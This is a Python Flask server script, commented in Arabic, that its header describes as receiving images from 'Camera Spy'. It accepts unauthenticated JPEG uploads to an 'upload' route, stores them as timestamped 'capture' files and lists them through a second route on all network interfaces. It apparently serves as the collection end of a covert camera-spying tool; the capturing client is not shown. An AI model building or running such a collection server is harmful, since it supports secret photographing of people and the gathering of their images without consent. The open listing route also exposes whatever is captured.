# ============================================================
# server.py - استقبال الصور من Camera Spy
# ============================================================

import os
import json
from flask import Flask, request, jsonify
from datetime import datetime

app = Flask(__name__)

# إنشاء مجلد لحفظ الصور
UPLOAD_FOLDER = 'captures'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/upload', methods=['POST'])
def upload_image():
    """استقبال الصورة وحفظها"""
    try:
        # التحقق من وجود ملف
        if 'file' not in request.files:
            return jsonify({'error': 'No file'}), 400
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({'error': 'Empty filename'}), 400
        
        # حفظ الملف
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"capture_{timestamp}.jpg"
        filepath = os.path.join(UPLOAD_FOLDER, filename)
        file.save(filepath)
        
        print(f"✅ تم استلام الصورة: {filename}")
        return jsonify({'status': 'success', 'filename': filename}), 200
        
    except Exception as e:
        print(f"❌ خطأ: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/list', methods=['GET'])
def list_images():
    """عرض قائمة الصور"""
    try:
        files = os.listdir(UPLOAD_FOLDER)
        return jsonify({'images': files}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)